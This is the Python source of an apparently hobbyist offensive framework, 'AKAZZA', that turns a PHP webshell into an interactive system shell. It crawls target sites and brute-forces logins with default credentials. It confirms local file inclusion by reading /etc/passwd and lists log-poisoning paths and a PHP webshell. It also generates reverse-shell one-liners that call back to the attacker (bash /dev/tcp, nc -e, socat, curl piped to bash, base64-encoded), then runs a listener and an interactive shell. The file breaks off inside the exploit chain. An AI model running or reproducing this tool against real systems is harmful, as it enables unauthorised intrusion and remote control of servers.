#!/usr/bin/env python3
"""
AKAZZA v1.10 - PHP WebShell to System Shell Framework (SMART PLUGIN EDITION)
Made by: joyboyvoidera

v1.10:
  [+] RECOVERY MENU: when all selected vectors fail (or all payloads fail),
      you now get a "PICK ANOTHER EXPLOIT" menu — retry last vector, run any
      vector by number, run ALL vectors, re-run SMART, or manual webshell URL.
      No more dead-end at the report menu after a failed vector.
  [+] FIXED login carry-over bug: recon now re-attempts login whenever it
      encounters a login form while not authenticated (previous sessions left
      _login_tried=True → "0 upload forms" with no login attempt at all)
  [+] run_selected_vectors / _exploit_chain return success booleans so the
      chooser knows when to stop
v1.9: CSRF-aware recon login, [p]ick in SMART, socat-first chain
"""

import os, re, sys, time, json, socket, select, base64
import platform, threading, importlib.util
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qsl

try:
    import requests
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

try:
    import termios, tty
    HAS_TERMIOS = True
except ImportError:
    HAS_TERMIOS = False

RED, GREEN, YELLOW = '\033[91m', '\033[92m', '\033[93m'
BLUE, MAGENTA, CYAN  = '\033[94m', '\033[95m', '\033[96m'
WHITE, RESET, BOLD   = '\033[97m', '\033[0m', '\033[1m'

# ═══════════════════════════════════════════════════════════
# CONFIG (shared with all plugins)
# ═══════════════════════════════════════════════════════════
CONFIG = {
    "default_target": "http://192.168.44.131/",
    "listen_port": 4444,
    "shell_param": "cmd",
    "crawl_max_pages": 25,
    "timeout": 12,
    "creds": [
        ("admin", "password"), ("admin", "admin"), ("root", ""),
        ("root", "toor"), ("root", "root"), ("dvwa", "p@ssw0rd"),
    ],
    "upload_dirs": ["uploads", "upload", "files", "up", "media", "images",
                   "assets/uploads", "hackable/uploads"],
    "pma_paths": ["phpmyadmin", "phpMyAdmin", "pma"],
    "lfi_params": ["page", "file", "path", "inc", "include", "template",
                  "doc", "view", "content", "lang", "module", "cat",
                  "folder", "load", "f", "p", "pg"],
    "log_paths": ["/var/log/apache2/access.log", "/var/log/apache2/error.log",
                 "/var/log/apache/access.log", "/var/log/nginx/access.log",
                 "/var/log/httpd/access_log", "/proc/self/environ"],
    "outfile_paths": ["/var/www/muzan.php", "/var/www/html/muzan.php",
                      "/usr/share/nginx/html/muzan.php", "/opt/lampp/htdocs/muzan.php"],
    "webshell_php": "<?php system($_REQUEST['cmd']); ?>",
}

# ═══════════════════════════════════════════════════════════
# PLUGIN REGISTRY
# ═══════════════════════════════════════════════════════════
PLUGINS = {"vector": [], "postex": [], "payload": []}
_plugins_loaded = False

def register_plugin(name, phase, priority=50, cwe=None, attck=None, desc="",
                    wants=None, avoids=None):
    def _wrap(func):
        PLUGINS[phase].append({"name": name, "priority": priority, "fn": func,
                               "cwe": cwe, "attck": attck, "desc": desc,
                               "wants": wants or [], "avoids": avoids or []})
        PLUGINS[phase].sort(key=lambda p: p["priority"])
        return func
    return _wrap

def load_plugins(plugin_dir="plugins"):
    global _plugins_loaded
    if _plugins_loaded:
        return
    _plugins_loaded = True
    # resolve plugins/ relative to THIS file (cwd-independent)
    here = os.path.dirname(os.path.abspath(__file__))
    plugin_dir = os.path.join(here, plugin_dir)
    if not os.path.isdir(plugin_dir):
        os.makedirs(plugin_dir, exist_ok=True)
        print(f"{YELLOW}[i]{RESET} created empty {plugin_dir}/")
        return
    for fname in sorted(os.listdir(plugin_dir)):
        if not fname.endswith(".py") or fname.startswith("_"):
            continue
        path = os.path.join(plugin_dir, fname)
        modname = f"akazza_plugin_{fname[:-3]}"
        try:
            spec = importlib.util.spec_from_file_location(modname, path)
            mod = importlib.util.module_from_spec(spec)
            mod.__dict__["register_plugin"] = register_plugin
            mod.__dict__["CONFIG"] = CONFIG
            mod.__dict__["col"] = dict(RED=RED, GREEN=GREEN, YELLOW=YELLOW,
                                       MAGENTA=MAGENTA, CYAN=CYAN, WHITE=WHITE,
                                       RESET=RESET, BOLD=BOLD)
            sys.modules[modname] = mod
            spec.loader.exec_module(mod)
            print(f"{GREEN}[plugin]{RESET} loaded {fname}")
        except Exception as e:
            print(f"{RED}[plugin]{RESET} failed to load {fname}: {e}")

def get_phase(phase):
    return PLUGINS[phase]


BANNER = f"""
{CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ▄▀█ █▄▄ ▄▀█ ▀▀█ ▀▀█ ▄▀█                                     ║
║   █▀█ █░█ █▀█ █▄▄ █▄▄ █▀█                                     ║
║                                                              ║
║   PHP WebShell → System Shell Framework      v1.10 SMART    ║
║   Made by: {RED}joyboyvoidera{CYAN}                              ║
║                                                              ║
║   assess · rank · recommend · {RED}recover{CYAN} · plugin-driven  ║
╚══════════════════════════════════════════════════════════════╝{RESET}
"""


class Akazza:
    def __init__(self):
        self.session_log = {
            "tool": "AKAZZA by joyboyvoidera", "version": "1.10",
            "mode": None, "vector": None, "vector_plugin": None,
            "start_time": None, "target_url": None, "shell_parameter": None,
            "shell_variant": None, "fingerprint": None, "payload_chain": None,
            "payload_method": None, "attacker_ip": None, "attacker_port": None,
            "user_agent": "akazza/1.10 (by joyboyvoidera)",
            "status": None, "auto_uploaded": None, "shell_verified": None,
            "postex_findings": [], "recon": None, "assessment": None,
            "vector_ranking": None,
        }
        self.shell_event = None
        self.shell_conn = None
        self.shell_verified = False
        self._listener_alive = True
        self._authenticated_sess = requests.Session()
        self._authenticated_sess.headers.update({"User-Agent": self.session_log["user_agent"]})
        self._auth_ok = False          # v1.10: login state (reset per attack run)
        self._last_filter = None        # for [r]etry in recovery menu
        self._current_target = None     # for recovery menu context
        self._lfi_helper = None

    def get_version(self): return "1.10"
    def clear_screen(self): os.system('cls' if platform.system() == "Windows" else "clear")
    def print_banner(self): print(BANNER)

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ── shared services for plugins ──
    def webshell_cmd(self, shell_url, param, cmd, timeout=25):
        try:
            r = requests.get(shell_url, params={param: cmd},
                             headers={"User-Agent": self.session_log["user_agent"]},
                             timeout=timeout)
            return r.text
        except Exception as e:
            return f"__ERROR__ {e}"

    def lfi_webshell_cmd(self, cmd):
        base_url, params, lfi_param, logpath, depth = self._lfi_helper
        p = dict(params)
        p[lfi_param] = "../" * depth + logpath.lstrip('/')
        p["akz"] = cmd
        try:
            r = requests.get(base_url, params=p, timeout=25,
                            headers={"User-Agent": self.session_log["user_agent"]})
            return r.text
        except Exception as e:
            return f"__ERROR__ {e}"

    def payload_core(self, method, ip, port):
        if method == "socat":  # full PTY shell out of the box
            return f"socat exec:'bash -i',pty,stderr TCP:{ip}:{port}"
        p = {
            "1": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "2": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "3": f"nc -e /bin/bash {ip} {port}",
            "4": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "5": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "6": f"curl http://{ip}:{port}/akazza.sh | bash",
            "8": f"echo {base64.b64encode(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'.encode()).decode()} | base64 -d | bash",
        }
        return p.get(method, p["1"])

    # ═══════════════════════════════════════════════════════════
    # PHASE R: generic recon (v1.10: re-attempt login until authenticated)
    # ═══════════════════════════════════════════════════════════
    def recon(self, target):
        print(f"\n{BOLD}{YELLOW}[Phase R]{RESET} Recon of {target} (crawl ≤{CONFIG['crawl_max_pages']} pages)...")
        base = target.rstrip('/') + '/'
        origin = f"{urlparse(base).scheme}://{urlparse(base).netloc}/"
        sess = self._authenticated_sess

        visited, queue = set(), [base]
        found = {"upload_forms": [], "login_forms": [], "params": {},
                 "interesting_dirs": {origin}}

        def _extract_csrf(html):
            hidden = {}
            for hm in re.finditer(r"<input[^>]*type=[\"']?hidden[\"']?[^>]*>", html, re.I):
                tag = hm.group(0)
                nm = re.search(r"name=[\"']([^\"']+)[\"']", tag)
                vl = re.search(r"value=[\"']([^\"']*)[\"']", tag)
                if nm:
                    hidden[nm.group(1)] = vl.group(1) if vl else ""
            return hidden

        def _try_login(html, page_url):
            """CSRF-aware login. Returns True on success."""
            for m in re.finditer(r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>(.*?)</form>",
                                 html, re.S | re.I):
                action, body = m.group(1), m.group(2)
                if not re.search(r"type=[\"']?password", body, re.I):
                    continue
                action_url = urljoin(page_url, action or "")

                fields = re.findall(r"<input[^>]*name=[\"']([^\"']*)[\"']", body, re.I)
                user_f = next((f for f in fields if f.lower() in
                               ("user", "username", "login", "email", "u")), "username")
                pass_f = next((f for f in fields if f.lower() in
                               ("pass", "password", "passwd", "pw")), "password")
                submit_f = next((f for f in fields if f.lower() in
                                ("login", "submit", "signin")), "Login")

                print(f"{YELLOW}[*]{RESET} login form found ({action_url}) — trying CONFIG creds "
                      f"(CSRF-aware)...")
                for u, pw in CONFIG["creds"]:
                    # FRESH token on EVERY attempt
                    try:
                        lp = sess.get(action_url, timeout=CONFIG["timeout"])
                        hidden = _extract_csrf(lp.text)
                    except Exception:
                        hidden = {}
                    data = dict(hidden)
                    data.update({user_f: u, pass_f: pw, submit_f: submit_f})
                    try:
                        sess.post(action_url, data=data, timeout=CONFIG["timeout"])
                        chk = sess.get(page_url, timeout=CONFIG["timeout"])
                        has_logout = "logout" in chk.text.lower()
                        no_pwbox = not re.search(r"type=[\"']?password", chk.text[:4000], re.I)
                        if has_logout and no_pwbox:
                            print(f"{GREEN}[+]{RESET} webapp login OK: {u}/{'*' * len(pw)} "
                                  f"(authenticated crawl active)")
                            return True
                    except Exception:
                        continue
                print(f"{YELLOW}[!]{RESET} webapp login: creds rejected (continuing unauth)")
                print(f"{YELLOW}[i]{RESET} if DVWA: visit {base}setup.php once → Create/Reset DB")
                return False
            return False

        while queue and len(visited) < CONFIG["crawl_max_pages"]:
            url = queue.pop(0)
            if url in visited:
                continue
            visited.add(url)
            try:
                r = sess.get(url, timeout=CONFIG["timeout"])
            except Exception:
                continue
            if 'text/html' not in r.headers.get('Content-Type', 'text/html'):
                continue
            html = r.text

            # ── v1.10: re-attempt login whenever a login form is seen and
            #    we are not yet authenticated (fixes stale-flag carry-over) ──
            if not self._auth_ok and re.search(r"type=[\"']?password", html, re.I):
                if _try_login(html, url):
                    self._auth_ok = True
                    try:
                        r = sess.get(url, timeout=CONFIG["timeout"])  # fresh, AUTHENTICATED
                        html = r.text
                    except Exception:
                        pass

            for m in re.finditer(r"<form[^>]*enctype=[\"']?multipart/form-data[\"']?[^>]*(.*?)</form>",
                                 html, re.S | re.I):
                form_html = m.group(0)
                action = re.search(r"action=[\"']([^\"']*)[\"']", m.group(0), re.I)
                action_url = urljoin(url, action.group(1)) if action else url
                fm = re.search(r"<input[^>]*type=[\"']?file[\"']?[^>]*name=[\"']([^\"']*)[\"']"
                               r"|<input[^>]*name=[\"']([^\"']*)[\"'][^>]*type=[\"']?file[\"']?",
                               form_html, re.I)
                field = (fm.group(1) or fm.group(2)) if fm else "file"
                extras = dict(re.findall(r"<input[^>]*name=[\"']([^\"']*)[\"'][^>]*value=[\"']([^\"']*)[\"']",
                                         form_html, re.I))
                if any(a[0] == action_url for a in found["upload_forms"]):
                    continue
                found["upload_forms"].append((action_url, field, extras))
                print(f"{GREEN}[+]{RESET} upload form: {action_url} (field: {field})")

            for href in re.findall(r"href=[\"']([^\"'#]+)[\"']", html, re.I):
                link = urljoin(url, href).split('#')[0]
                if origin in link and link not in visited:
                    queue.append(link)
                q = urlparse(link).query
                if q:
                    found["params"].setdefault(link, [k for k, _ in parse_qsl(q)])
                    found["interesting_dirs"].add(link.rsplit('/', 1)[0] + '/')

        self.session_log["recon"] = {
            "pages_crawled": len(visited),
            "upload_forms": [f[0] for f in found["upload_forms"]],
            "lfi_candidate_urls": list(found["params"].keys())[:10],
        }
        print(f"{GREEN}[+]{RESET} Recon: {len(visited)} pages, "
              f"{len(found['upload_forms'])} upload form(s), "
              f"{len(found['params'])} dynamic URL(s)")
        return found

    # ═══════════════════════════════════════════════════════════
    # ASSESSMENT ENGINE
    # ═══════════════════════════════════════════════════════════
    PHP_PROBE_PATHS = ["info.php", "phpinfo.php", "test.php", "php.php",
                       "composer.json", "adminer.php", "server-status"]

    def assess_target(self, target, surface):
        findings = []
        sess = self._authenticated_sess
        ua = {"User-Agent": self.session_log["user_agent"]}

        print(f"\n{BOLD}{MAGENTA}── PHP VULNERABILITY ASSESSMENT ──{RESET}")

        try:
            r = sess.get(target, timeout=CONFIG["timeout"], headers=ua)
            php_ver = re.search(r"PHP/([\d.]+)",
                                str(r.headers.get("X-Powered-By", "")), re.I)
            if php_ver:
                findings.append((f"PHP version disclosed: {php_ver.group(1)}",
                                 "php_disclosed", 25))
                print(f"{YELLOW}[i]{RESET} PHP/{php_ver.group(1)} disclosed in headers")
            if "Apache" in r.headers.get("Server", ""):
                findings.append((f"Apache detected: {r.headers['Server']}", "apache", 10))
                print(f"{YELLOW}[i]{RESET} Server: {r.headers['Server']}")
        except Exception as e:
            print(f"{RED}[-]{RESET} header check failed: {e}")

        for path in self.PHP_PROBE_PATHS:
            probe = f"{target.rstrip('/')}/{path}"
            try:
                r = requests.get(probe, timeout=6, headers=ua)
                if r.status_code == 200 and len(r.text) > 200:
                    txt = r.text
                    if path in ("info.php", "phpinfo.php", "test.php", "php.php") \
                       and ("PHP Version" in txt or "phpinfo()" in txt):
                        findings.append((f"phpinfo() exposed at /{path}", "phpinfo", 40))
                        print(f"{RED}[✔]{RESET} phpinfo() EXPOSED: /{path}")
                    elif path == "composer.json" and '"require"' in txt:
                        findings.append(("composer.json readable", "composer", 20))
                        print(f"{YELLOW}[i]{RESET} composer.json readable")
                    elif path == "adminer.php" and "Adminer" in txt:
                        findings.append(("Adminer DB tool", "pma_found", 45))
                        print(f"{YELLOW}[i]{RESET} Adminer found")
            except Exception:
                continue

        if surface["upload_forms"]:
            findings.append(("target has file upload form(s)", "upload_form", 25))
            for action, field, extras in surface["upload_forms"]:
                try:
                    r = sess.get(action, timeout=6, headers=ua)
                    weak_hints = [("onchange" in r.text.lower()),
                                  ("getimagesize" not in r.text.lower()),
                                  ("mime_content_type" not in r.text.lower()),
                                  ("exif_imagetype" not in r.text.lower())]
                    if sum(weak_hints) >= 3:
                        findings.append((f"upload at {action} looks client-side-validated",
                                         "upload_weak", 55))
                        print(f"{YELLOW}[i]{RESET} upload ({action}) — weak validation (heuristic)")
                    else:
                        findings.append((f"upload at {action} has server-side hints",
                                         "upload_strict", -15))
                        print(f"{CYAN}[⚑]{RESET} upload ({action}) — may be strict")
                except Exception:
                    pass

        for url, params in surface["params"].items():
            done = False
            for p in params:
                if p.lower() in CONFIG["lfi_params"]:
                    base, qp = url.split("?", 1) if "?" in url else (url, "")
                    pp = dict(parse_qsl(qp))
                    pp[p] = "../../../../../../../../etc/passwd"
                    try:
                        r = sess.get(base, params=pp, timeout=8, headers=ua)
                        if "root:x:" in r.text:
                            findings.append((f"LFI CONFIRMED in '{p}' at {base}",
                                             "lfi_confirmed", 90))
                            print(f"{RED}[✔]{RESET} LFI CONFIRMED: {base}?{p}=")
                            done = True; break
                        else:
                            findings.append((f"LFI candidate '{p}'", "lfi_candidate", 30))
                    except Exception:
                        pass
                break
            if done:
                break

        pma_found = False
        for path in CONFIG["pma_paths"]:
            probe = f"{urlparse(target).scheme}://{urlparse(target).netloc}/{path}/"
            try:
                r = requests.get(probe, timeout=6, headers=ua)
                if r.status_code == 200 and re.search(r"phpmyadmin|pma_|signon",
                                                      r.text, re.I):
                    pma_found = True
                    findings.append((f"phpMyAdmin at /{path}/", "pma_found", 60))
                    print(f"{YELLOW}[i]{RESET} phpMyAdmin at /{path}/")
                    break
            except Exception:
                continue
        if not pma_found:
            findings.append(("phpMyAdmin not found", "pma_missing", -30))
            print(f"{CYAN}[⚑]{RESET} phpMyAdmin not found")

        if not findings:
            print(f"{YELLOW}[!]{RESET} no PHP-specific weaknesses detected")
        self.session_log["assessment"] = [{"desc": d, "tag": t, "weight": w}
                                          for d, t, w in findings]
        return findings

    # ═══════════════════════════════════════════════════════════
    # SMART MODE
    # ═══════════════════════════════════════════════════════════
    def smart_attack(self, target=None):
        self.clear_screen(); self.print_banner()
        self.session_log["mode"] = "smart"
        self.session_log["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._auth_ok = False          # fresh login attempt for this run
        print(f"{WHITE}{'─' * 50}{RESET}")
        print(f"{BOLD}{MAGENTA}  AKAZZA SMART MODE{RESET} — assess, rank, recommend, attack")
        print(f"{WHITE}{'─' * 50}{RESET}\n")

        if target is None:
            target = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                          f"Target [{CONFIG['default_target']}]: ").strip() \
                or CONFIG["default_target"]
        target = target.rstrip('/') + '/'
        self._current_target = target
        surface = self.recon(target)
        findings = self.assess_target(target, surface)

        vectors = get_phase("vector")
        if not vectors:
            print(f"{RED}[-]{RESET} no vector plugins loaded")
            self.post_attack_menu(); return

        tag_weights, neg_tags = {}, {}
        for _, tag, weight in findings:
            if weight < 0:
                neg_tags[tag] = weight
            else:
                tag_weights[tag] = max(tag_weights.get(tag, 0), weight)

        scored = []
        for v in vectors:
            score, matched = 0, []
            for tag in v["wants"]:
                if tag in tag_weights:
                    score += tag_weights[tag]
                    matched.append(f"{tag}(+{tag_weights[tag]})")
                elif tag in neg_tags:
                    score += neg_tags[tag]
                    matched.append(f"{tag}({neg_tags[tag]})")
            for tag in v["avoids"]:
                if tag in neg_tags:
                    score += neg_tags[tag]
                    matched.append(f"¬{tag}({neg_tags[tag]})")
            scored.append((max(0, min(99, score)), v, matched))
        scored.sort(key=lambda x: -x[0])

        print(f"\n{BOLD}{MAGENTA}── VECTOR RANKING (evidence-based) ──{RESET}")
        for i, (score, v, matched) in enumerate(scored, 1):
            bar = f"{MAGENTA}{'█' * int(score / 10)}{RESET}" if score else f"{YELLOW}·{RESET}"
            print(f"{YELLOW}[{i}]{RESET} {v['name']:<40} {BOLD}{score:>3}%{RESET} {bar}")
            if matched:
                print(f"      {CYAN}evidence: {', '.join(matched)}{RESET}")
        self.session_log["vector_ranking"] = [{"name": v["name"], "score": s}
                                              for s, v, _ in scored]

        best_score, best, _ = scored[0]
        if best_score < 25:
            print(f"\n{YELLOW}[!]{RESET} No strong evidence — falling back to all vectors...")
            self.run_selected_vectors(target, name_filter=None)
            return

        print(f"\n{GREEN}[?]{RESET} {BOLD}Recommended: {best['name']}{RESET} "
              f"(confidence {best_score}%)")
        ans = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                    f"Run it? [Y]es / [a]ll / {BOLD}[p]ick{RESET} / [n]o: ").strip().lower()
        if ans in ("", "y"):
            self.run_selected_vectors(target, name_filter=best["name"])
        elif ans == "a":
            self.run_selected_vectors(target, name_filter=None)
        elif ans == "p":
            self._pick_ranked_vector(scored, target, best)
        else:
            self.post_attack_menu()

    def _pick_ranked_vector(self, scored, target, best):
        """SMART-mode picker over the RANKED list."""
        while True:
            print(f"\n{BOLD}{MAGENTA}── PICK A PLUGIN TO RUN ──{RESET}")
            for i, (score, v, matched) in enumerate(scored, 1):
                print(f"  {YELLOW}[{i}]{RESET} {BOLD}{v['name']:<42}{RESET}"
                      f"{GREEN}{score:>3}%{RESET}  {CYAN}{v['cwe'] or ''}{RESET}")
                if v.get("desc"):
                    print(f"      {YELLOW}{v['desc'][:70]}{RESET}")
                if matched:
                    print(f"      {CYAN}evidence: {', '.join(matched)}{RESET}")
            n = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                      f"vector # (blank = recommended / [r]elist / [b]ack): ").strip()
            if n == "":
                self.run_selected_vectors(target, name_filter=best["name"])
                return
            if n == "r":
                continue
            if n == "b":
                return
            if n.isdigit() and 1 <= int(n) <= len(scored):
                chosen = scored[int(n) - 1][1]["name"]
                print(f"{CYAN}[*]{RESET} Running ONLY '{chosen}'")
                self.run_selected_vectors(target, name_filter=chosen)
                return
            print(f"{RED}[!]{RESET} bad choice")

    # ═══════════════════════════════════════════════════════════
    # v1.10: RECOVERY CHOOSER — shown after vectors/payloads fail
    # ═══════════════════════════════════════════════════════════
    def _vector_chooser(self, target=None):
        """Dead-end killer: after a failed vector, pick another exploit."""
        target = (target or self._current_target or CONFIG["default_target"]).rstrip('/') + '/'
        self._current_target = target
        vectors = get_phase("vector")

        while True:
            print(f"\n{MAGENTA}╔══════════════════════════════════════════════════════════╗{RESET}")
            print(f"{MAGENTA}║  {WHITE}PICK ANOTHER EXPLOIT{MAGENTA} — previous vector(s) failed ║{RESET}")
            print(f"{MAGENTA}╠══════════════════════════════════════════════════════════╣{RESET}")
            if vectors:
                for i, v in enumerate(vectors, 1):
                    score = next((r["score"] for r in (self.session_log.get("vector_ranking") or [])
                                 if r["name"] == v["name"]), None)
                    sstr = f"{GREEN}{score:>3}%{RESET}" if score is not None else f"{YELLOW} --{RESET}"
                    last = f" {RED}← just tried{RESET}" if (self._last_filter and
                              self._last_filter.lower() in v["name"].lower()) else ""
                    print(f"{MAGENTA}║{RESET}  {YELLOW}[{i}]{RESET} {BOLD}{v['name'][:44]:<44}{RESET} {sstr}{last}")
            print(f"{MAGENTA}║{RESET}                                                          {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[a]{RESET} ALL vectors (priority order)              {MAGENTA}║{RESET}")
            if self._last_filter:
                print(f"{MAGENTA}║{RESET}  {YELLOW}[r]{RESET} Retry last vector "
                      f"'{self._last_filter[:24]}'          {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[t]{RESET} Different target URL                    {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[s]{RESET} Re-run SMART assessment                 {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[m]{RESET} Manual webshell URL                     {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[g]{RESET} Reports / summary                       {MAGENTA}║{RESET}")
            print(f"{MAGENTA}║{RESET}  {YELLOW}[x]{RESET} Exit                                   {MAGENTA}║{RESET}")
            print(f"{MAGENTA}╚══════════════════════════════════════════════════════════╝{RESET}")

            c = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} "
                      f"target={target} · option: ").strip().lower()

            if c.isdigit() and vectors and 1 <= int(c) <= len(vectors):
                chosen = vectors[int(c) - 1]["name"]
                print(f"{CYAN}[*]{RESET} Running '{chosen}'")
                if self.run_selected_vectors(target, name_filter=chosen):
                    self.post_attack_menu()
                    return
                # failed again → loop back to chooser (list refreshed)
                vectors = get_phase("vector")
            elif c == "a" and vectors:
                if self.run_selected_vectors(target, name_filter=None):
                    self.post_attack_menu()
                    return
                vectors = get_phase("vector")
            elif c == "r" and self._last_filter:
                if self.run_selected_vectors(target, name_filter=self._last_filter):
                    self.post_attack_menu()
                    return
                vectors = get_phase("vector")
            elif c == "t":
                new_t = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} New target URL: ").strip()
                if new_t:
                    target = new_t.rstrip('/') + '/'
                    self._current_target = target
                    self._auth_ok = False      # fresh login for new target
            elif c == "s":
                self.smart_attack(target=target)
                return
            elif c == "m":
                su = input(f"{BOLD}{WHITE}akazza{RESET} {CYAN}➜{RESET} Webshell URL: ").strip()
                if su:
                    p = input(f"Param [{CONFIG['shell_param']}]: ").strip() or CONFIG["shell_param"]
                    if self._exploit_chain(su, p):
                        self.post_attack_menu()
                        return
            elif c == "g":
                self.post_attack_menu()
                return
            elif c == "x":
                sys.exit(0)
            else:
                print(f"{RED}[!]{RESET} bad choice")

    # ── fingerprint (full chain socat → ... → Curl Pipe) ──
    def fingerprint_victim(self, shell_url, param):
        print(f"\n{YELLOW}[*]{RESET} Fingerprinting victim (single request)...")
        probe = ("for t in nc nc.traditional ncat socat python python3 perl php curl wget bash sh; do "
                 "p=$(which $t 2>/dev/null) && echo \"$t=$p\"; done; "
                 "echo \"uname=$(uname -s -m -r 2>/dev/null)\"; echo \"whoami=$(whoami)\"")
        out = self.webshell_cmd(shell_url, param, probe)
        fp = {}
        for line in out.splitlines():
            if "=" in line and "__ERROR__" not in line:
                k, v = line.split("=", 1)
                fp[k.strip()] = v.strip()
        if not fp:
            fp = {"bash": "/bin/bash"}
        print(f"{GREEN}[+]{RESET} Fingerprint:")
        for k, v in fp.items():
            print(f"    {k:<16}{v}")
        self.session_log["fingerprint"] = fp
        netcat = fp.get("nc") or fp.get("nc.traditional") or fp.get("ncat")
        chain = []
        if fp.get("socat"):                          chain.append(("socat", "socat"))
        if fp.get("bash") or fp.get("sh"):           chain.append(("Bash TCP", "1"))
        if netcat:                                   chain.append(("Netcat", "3"))
        if fp.get("python") or fp.get("python3"):     chain.append(("Python", "2"))
        if fp.get("perl"):                           chain.append(("Perl", "5"))
        if fp.get("php"):                            chain.append(("PHP Socket", "4"))
        if fp.get("curl") or fp.get("wget"):         chain.append(("Curl Pipe", "6"))
        if not chain:
            chain = [("Bash TCP", "1")]
        return fp, chain

    # ── verified listener ──
    def start_builtin_listener(self, host, port, timeout=60):
        self.shell_event = threading.Event()
        self.shell_conn = None
        self.shell_verified = False
        self._listener_alive = True

        def _listen():
            srv = None
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind((host, int(port))); srv.listen(1)
                srv.settimeout(timeout)
                if self._listener_alive:
                    print(f"{GREEN}[+]{RESET} Listener armed on {host}:{port} (timeout {timeout}s)")
                conn, addr = srv.accept()
                self.shell_conn = conn
                print(f"{GREEN}[+]{RESET} Connection from {addr[0]}:{addr[1]}")
                time.sleep(0.5)
                conn.send(b"echo ___AKAZZA_OK___; id\n")
                time.sleep(1.5)
                try:
                    banner = conn.recv(65535).decode(errors="replace")
                except Exception:
                    banner = ""
                if "___AKAZZA_OK___" in banner or "uid=" in banner:
                    self.shell_verified = True
                    self.session_log["shell_verified"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.session_log["status"] = "SHELL VERIFIED"
                    print(f"{GREEN}[★]{RESET} {BOLD}SHELL CONFIRMED!{RESET}")
                self.shell_event.set()
            except socket.timeout:
                if self._listener_alive:
                    print(f"{RED}[-]{RESET} Listener timed out")
                self.shell_event.set()
            except Exception as e:
                if self._listener_alive:
                    print(f"{RED}[-]{RESET} Listener error: {e}")
                self.shell_event.set()
            finally:
                if srv:
                    try: srv.close()
                    except Exception: pass
        threading.Thread(target=_listen, daemon=True).start()

    def stop_listener(self): self._listener_alive = False

    # ── interactive shell ──
    def interactive_shell_session(self, conn):
        if platform.system() == "Linux" and HAS_TERMIOS:
            try:
                conn.send(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || "
                          b"python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null\n")
                time.sleep(1.5)
                try: conn.recv(65535)
                except Exception: pass
                conn.send(b"export TERM=xterm\n"); time.sleep(0.5)
                try: conn.recv(65535)
                except Exception: pass
            except Exception: pass
            print(f"\n{MAGENTA}── INTERACTIVE SHELL (Ctrl-] to exit) ──{RESET}")
            old = termios.tcgetattr(0)
            try:
                tty.setraw(0)
                while True:
                    r, _, _ = select.select([sys.stdin, conn], [], [])
                    if sys.stdin in r:
                        d = os.read(0, 1024)
                        if d == b"\x1d": break
                        conn.send(d)
                    if conn in r:
                        out = conn.recv(65535)
                        if not out: break
                        os.write(1, out)
            finally:
                termios.tcsetattr(0, termios.TCSADRAIN, old)
            print(f"\n{MAGENTA}[i]{RESET} Shell session closed.")
        else:
            print(f"\n{MAGENTA}── INTERACTIVE SHELL ('exit_akazza' to quit) ──{RESET}")
            def _pr():
                while True:
                    try:
                        d = conn.recv(65535)
                        if not d: break
                        print(d.decode(errors="replace"), end="", flush=True)
                    except Exception: break
            threading.Thread(target=_pr, daemon=True).start()
            while True:
                try: cmd = input()
                except EOFError: break
                if cmd.strip().lower() == "exit_akazza": break
                conn.send(cmd.encode() + b"\n"); time.sleep(0.3)

    # ── EXPLOIT CHAIN (returns True on shell obtained) ──
    def _exploit_chain(self, shell_url, param):
        self.session_log["attacker_ip"] = self.get_local_ip()
        self.session_log["attacker_port"] = str(CONFIG["listen_port"])
        ip, port = self.session_log["attacker_ip"], self.session_log["attacker_port"]
        print(f"\n{CYAN}[*]{RESET} Attacker: {ip}:{port} (built-in listener)")

        lfi_mode = (shell_url == "__LFI__")
        display_url = "LFI-mode (log-poisoned)" if lfi_mode else shell_url

        def _cmd(c):
            return self.lfi_webshell_cmd(c) if lfi_mode else \
                self.webshell_cmd(shell_url, param, c)

        print(f"{YELLOW}[*]{RESET} Pre-flight reachability...")
        try:
            out = _cmd(f"ping -c 2 {ip}")
            if "ttl=" in out.lower():
                print(f"{GREEN}[+]{RESET} victim reaches {ip}")
            else:
                print(f"{RED}[-]{RESET} victim CANNOT ping {ip} — network/IP/firewall?")
        except Exception:
            print(f"{YELLOW}[!]{RESET} Pre-flight inconclusive")

